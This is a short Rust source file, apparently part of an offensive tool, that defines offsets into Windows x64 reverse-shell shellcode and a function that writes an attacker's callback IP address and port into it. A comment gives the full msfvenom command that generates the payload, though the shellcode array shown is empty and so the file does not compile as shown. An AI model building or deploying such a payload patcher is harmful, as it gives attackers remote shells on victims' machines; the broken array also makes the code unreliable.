pub const OFFSET_PORT: usize = 232;
pub const OFFSET_IPV4: usize = 234;

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw
pub const SHELLCODE: &[u8] = &[
    ,
];

fn parse_ipv4(ip_str: &str) -> Result<[u8; 4], String> {
    let parts: Vec<&str> = ip_str.split('.').collect();
    if parts.len() != 4 {
        return Err(format!("invalid IPv4 address: {ip_str}"));
    }
    let mut ip = [0u8; 4];
    for (i, part) in parts.iter().enumerate() {
        let octet: u8 = part.parse().map_err(|_| format!("invalid octet: {part}"))?;
        ip[i] = octet;
    }
    Ok(ip)
}

pub fn patch_shellcode(lhost: &str, port: u16) -> Result<Vec<u8>, String> {
    let mut buf = SHELLCODE.to_vec();
    if OFFSET_PORT + 1 >= buf.len() {
        return Err(format!("port offset {OFFSET_PORT} out of bounds"));
    }
    let port_bytes = port.to_be_bytes();
    buf[OFFSET_PORT] = port_bytes[0];
    buf[OFFSET_PORT + 1] = port_bytes[1];
    let ip = parse_ipv4(lhost)?;
    if OFFSET_IPV4 + 3 >= buf.len() {
        return Err(format!("IPv4 offset {OFFSET_IPV4} out of bounds"));
    }
    buf[OFFSET_IPV4..OFFSET_IPV4 + 4].copy_from_slice(&ip);
    Ok(buf)
}
